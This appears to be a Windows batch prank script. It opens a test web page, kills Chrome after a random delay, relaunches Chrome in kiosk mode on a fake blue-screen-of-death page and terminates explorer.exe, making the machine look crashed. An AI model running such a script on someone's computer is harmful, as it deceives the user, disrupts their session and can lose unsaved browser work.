@echo off

SET updaterp=C:\winapp\BSOD_fake
set /a rand=%random% %%20+5

start "" "chrome.exe" "https://openlab-2-2023.github.io/mm-test/index.html?noloading"

timeout /t %rand% /nobreak

taskkill /f /im chrome.exe

timeout /t 1 /nobreak

start "" "chrome.exe" -kiosk "https://fakeupdate.net/win10ue/bsod.html"  //"https://fakeupdate.net/win10ue/" 

taskkill /f /im explorer.exe